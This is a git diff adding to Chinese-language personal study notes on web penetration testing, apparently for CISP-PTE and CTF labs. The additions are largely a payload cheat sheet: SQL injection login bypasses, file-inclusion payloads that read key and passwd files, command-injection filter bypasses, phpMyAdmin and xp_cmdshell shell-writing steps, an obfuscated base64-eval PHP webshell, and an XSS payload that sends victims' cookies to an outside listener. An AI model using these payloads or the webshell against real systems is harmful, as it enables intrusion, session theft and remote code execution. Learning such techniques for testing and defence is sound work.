@@ -1,5 +1,17 @@
 ### sql注入
 
+![image-20220718212513907](https://cdn.jsdelivr.net/gh/klsfct/images_mkdocs/Img/image-20220718212513907.png)
+
+万能密码
+
+’ ‘ or '1'='1'
+
+admin' Oorr '1'='1
+
+或者sqlmap跑
+
+
+
 一次注入
 
 ```sql
@@ -164,11 +176,27 @@ select '0' + (ascii (substr((select database()) from 1 for 1))) + '0'  from user
 
 
 select '' select database()''  from user where ema
+
+先注册 admin'# 
+在注册一个带单引号的 #
+在修改 admin‘#的密码 这样修改的就是admin的密码
 ```
 
 
 
+```
+select * from Article where uuid = '983fd952-df4e-4b63-946f-f2e6bb0327d6' and '1'='1'
 
+过滤了-- 和#号
+可以用 and '1'直接绕过，也可以用  ;%00 做截断
+```
+
+
+
+```
+注册账号，发表文章
+on抓包提取文章的链接
+```
 
 
 
@@ -176,12 +204,15 @@ select '' select database()''  from user where ema
 
 先去访问这个包含的页面，是否是解析
 
+五星推荐https://www.cnblogs.com/ichunqiu/p/10683379.html
+
 1.伪协议
 
 过滤一些关键字可以 双写，大小写
 
 ```ruby
 index.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
+php://filter/convert.base64-encode/resource=../key.php
 
 >> filter/read=convert.base64-encode/resource=/etc/passwd
 
@@ -189,9 +220,55 @@ index.php?page=php://filter/read=convert.base64-encode/resource=/etc/passwd
 
 index.php?page=phphp://p://filter/read=convert.base64-encode/resource=../key.php
 /index.php?page=pphp://hp://filter/read=convert.base64-encode/resource=../key.php
+
+?phar
+
+
 ```
 
+只能上传txt,但是有一个可以读取编译成php的文件
+
+用phar的伪协议 要先进行压缩，ceshi.php变成压缩包再换成.txt
+
+本质上还是zip压缩包所以用phar协议
+
+http://150.158.88.26:10004/lfi.php?file=phar://files/GHABsTD1XQQRq8Q6.txt/ceshi
+
+
+
+```
+>> hello.txt
+http://123.60.47.130:38893/start/index.php?page=hello
+
+data伪协议或者远程文件包含
+可以用data:text/plain,<?php phpinfo();?>
+<?php system("cat ../key.php"); ?>.txt
+```
+
+小马
+
+```php+HTML
+
+<?php 
+@$a = $_POST['Hello']; 
+if(isset($a)){ 
+@preg_replace("/\[(.*)\]/e",'\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=')); 
+} 
+?>
+Hello
+<br>
+Are you ok?
+
+文件包含 ，此文件是小马
+```
+
+
+
 ### 命令执行
+
+https://zhuanlan.zhihu.com/p/391439312
+
+#### 命令执行(RCE)面对各种过滤，骚姿势绕过总结
 
 代码审计
 
@@ -201,7 +278,7 @@ index.php?page=phphp://p://filter/read=convert.base64-encode/resource=../key.php
 
 7$IFS$9. ./ke*
 
-
+看看是否有一些过滤的执行函数
 
 ```shell
 <?php
@@ -221,6 +298,7 @@ $o=strtolower("");system('ls');("");
 eval("\$o=strtolower(\" ");system('ls');("     \");");
 
 /index.php?a=");system('ls');("
+a=${system("cat key4.php")}  这种是大变量形式
 ```
 
 2.文件可解析为执行文件php
@@ -240,7 +318,12 @@ if(isset($a)){
 
 命令执行
 
-
+```text
+PHP代码执行函数：
+eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等
+PHP命令执行函数：
+system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等
+```
 
 0x03借助命令Is 查看key的权限←
 127.0. 0.1.& ‘|’
@@ -267,9 +350,36 @@ Content-Di sposition: form- data; name=" cmd'
 ←
 0x05借助命令Is 验证key的权限←
 
+```
+命令执行ping
+1.判断管道符   ； | & || &&
+
+2，绕过 127.0.0.1;l's  ../
+有无权限 加  c'h'o'm'd 777
+cat 过滤了用  cat  ./ke?.??
+
+
+
+先复制权限
+
+验证主机是否存活
+用来读文件
+http://123.60.47.130:8384/vulnerabilities/fu1.php
+cmd=127.0.0.1
+
+要对文件进行可读权限，
+
+常用的绕过  ls 
+
+```
+
 
 
 ### 文件上传
+
+
+
+https://blog.csdn.net/weixin_43795682/article/details/118274320
 
 1.文件上传后被修改了文件名，利用burp爆破
 
@@ -279,7 +389,8 @@ $filename = $files["name"]; //456
  $randnum = rand(1, 99999);  //123
  $fullpath = '/' . md5($filename.$randnum).".".substr($filename,strripos($filename,'.') + 1); 
  
- /md5(456123).php
+上传名字sqzr.php
+ /md5(sqzr.php456123).php
  
  网站根目录
  /md5(文件全名+rand(1, 99999))
@@ -333,6 +444,8 @@ if (unserialize($str) === $TEMP)
 }
 show_source(__FILE__); 
   
+  
+  str=s:44:"Whatever is worth doing is worth doing well.";
 ```
 
 
@@ -365,18 +478,7 @@ $a()
 
 参考ctfshow256
 
-```
 
-```
-
-```
-
-```
-
-```
-
-} 
-```
 
 ```
 <?php 
@@ -389,7 +491,13 @@ class ctfuser{
 
 
 
-xss打cookie
+
+
+
+
+
+
+### xss打cookie
 
 评论留言页面
 
@@ -402,7 +510,69 @@ python -m SimpleHTTPServer 9999
 
 ```
 "><script>document.write('< img src="http://172.16.143.13:9999/?'+document.cookie+'" />')</script>
+
+拿到sessin登录
+或者seessino有key
+
 ```
+
+```php
+<?php
+show_source(__FILE__);
+$v1 = 0;
+$v2 = 0;
+
+$a = (array)json_decode(@$_GET['w']);
+
+if (is_array($a)) {
+    is_numeric(@$a["bar1"]) ? die("nope") : NULL;
+
+    if (@$a["bar1"]) {
+        var_dump($a["bar1"]);
+        $ww=$a["bar1"] > 2020;
+        var_dump($ww);
+        ($a["bar1"] > 2020) ? $v1 = 1 : NULL;
+
+    }
+
+    if (is_array(@$a["bar2"])) {
+        if (count($a["bar2"]) !== 5 OR !is_array($a["bar2"][0]))
+            die("nope");
+        $pos = array_search("cisp-pte", $a["bar3"]);
+        $pos === false ? die("nope") : NULL;
+        foreach ($a["bar2"] as $key => $val) {
+            $val === "cisp-pte" ? die("nope") : NULL;
+        }
+        $v2 = 1;
+    }
+}
+
+if ($v1 && $v2) {
+    include("key.php");
+    echo $key;
+}
+?>
+
+
+http://123.60.47.130:10031/code1.php?w={"bar1":“2021w”  php弱类型
+    "bar2":[[1],2,3,4,5]
+"bar3":["cisp-pte"]
+```
+
+
+
+### 访问控制
+
+```
+失效的访问控制
+请使用admin用户访问权限获取KEY
+
+添加X-Forwarded-F
+cookie中修改 base64 为admin
+
+```
+
+
 
 ### 日志审计
 
@@ -429,7 +599,7 @@ IP地址
 ```
 http://119.91.93.173/
 
-
+1.端口扫描
 nmap -sV -T5 -p 1434,1433,1025,8080,80 119.91.93.173
 
 PORT     STATE SERVICE    VERSION
@@ -439,5 +609,60 @@ PORT     STATE SERVICE    VERSION
 1434/tcp open  tcpwrapped
 8080/tcp open  http       Microsoft IIS httpd 6.0
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+22 ftp匿名登陆
+浏览器ftp://ip可以访问后台页面
+1433 sqlserver sa提权
+
+
+
+2.扫描web目录
+找敏感文件
+是否有参数  可能包含文件包含或者注入漏洞
+
+config 
+phpinfo的web路径  script-filename的值
+
+后台登陆页面
+
+通过得到数据库连接密码得到key
+
+
+3.登录后台
+看有无上传的点
+pdf文件和上传后的路径
+上传后是否能解析，要结合文件解析
+用绝对路径包含文件  用php://filter/convert.base64encode
+
+4.连接上传shell
+可以用xp_cmdshell  上传改后缀或者直接写马
+
+```
+
+
+
+```
+http://123.60.47.130:58125/
+
+1.401密码暴力破解
+2.用burp爆破目录
+3.访问robots.txt 得到key  User-agent: * Disallow: /news/
+4.爆破目录加/news/
+得到phpadmin目录
+
+5.phpadmin写马
+phpmyadmin中写马两种思路https://blog.csdn.net/qq_33942040/article/details/108577874
+
+或者弱口令
+得到key
+
+菜刀和ant链接
+
+ant连接不成功，要换编码器base编码，或者用菜刀
+
+6.3389
+上传3389bat
+远程登录
+得到key
 ```
 
